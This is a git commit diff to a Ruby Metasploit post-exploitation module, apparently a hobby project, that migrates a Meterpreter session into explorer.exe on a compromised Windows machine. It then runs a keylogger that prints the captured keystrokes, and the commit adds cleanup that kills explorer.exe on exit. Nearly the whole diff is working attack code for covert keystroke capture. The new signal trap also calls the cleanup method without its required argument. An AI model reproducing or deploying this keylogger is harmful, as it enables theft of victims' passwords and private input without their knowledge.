3c0df0a2a0df3c932c5f18bb94308d741c381492
Rahzbob <tom.dejardin94@gmail.com>
2024-03-24 22:48:28 +0100

    Add cleanup and exit system

--- big_brogger.rb
+++ big_brogger.rb
@@ -19,6 +19,9 @@ class MetasploitModule < Msf::Post
   end
 
   def run
+    # Trap SIGINT (Ctrl+C) signal
+    trap('INT') { cleanup_and_exit }
+
     print_status('Attempting to migrate to explorer.exe...')
 
     begin
@@ -26,14 +29,15 @@ class MetasploitModule < Msf::Post
       process_list = client.sys.process.get_processes
 
       # Find the PID of the explorer.exe process
-      explorer_pid = process_list.find { |proc| proc['name'] =~ /explorer\.exe/i }['pid']
+      explorer_proc = process_list.find { |proc| proc['name'] =~ /explorer\.exe/i }
+      explorer_pid = explorer_proc['pid']
 
       # Migrate to explorer.exe process
       client.core.migrate(explorer_pid)
-
-      print_good('Successfully migrated to explorer.exe (PID: #{explorer_pid})')
+      print_good("Successfully migrated to explorer.exe (PID: #{explorer_pid})")
     rescue Rex::Post::Meterpreter::RequestError => e
-      print_error('Error occurred: #{e.message}')
+      print_error("Failed to migrate to explorer.exe: #{e.message}. Exiting...")
+      return
     end
 
     print_status('Keylogger started...')
@@ -48,22 +52,34 @@ class MetasploitModule < Msf::Post
 
         # Print the captured keys
         if captured_keys.present?
-          print_status('Captured keys: #{captured_keys}')
+          print_status("Captured keys: #{captured_keys}")
         else
           # Sleep for a short duration to avoid high CPU usage
-          sleep(0.5)
+          sleep(1)
         end
-      rescue Rex::ConnectionError
-        print_status('Connection error occurred. Exiting keylogger.')
-        break
       end
+    rescue Rex::ConnectionError
+      print_status('Connection error occurred. Exiting keylogger.')
     rescue Rex::RuntimeError => e
-      print_error('Error occurred: #{e.message}')
+      print_error("Error occurred: #{e.message}")
     ensure
+      cleanup_and_exit(explorer_proc)
+    end
+  end
+
+  def cleanup_and_exit(explorer_proc)
+    begin
       # Stop the keyscan capture
       client.ui.keyscan_stop
-    end
+      print_status('Keylogger stopped.')
 
-    print_status('[*] Keylogger stopped.')
+      # Kill explorer.exe process
+      print_status('Attempting to kill explorer.exe...')
+      client.sys.process.kill(explorer_proc['pid'])
+      print_good('Successfully killed explorer.exe.')
+    rescue => e
+      print_error("Error during cleanup: #{e.message}")
+    end
+    exit
   end
 end
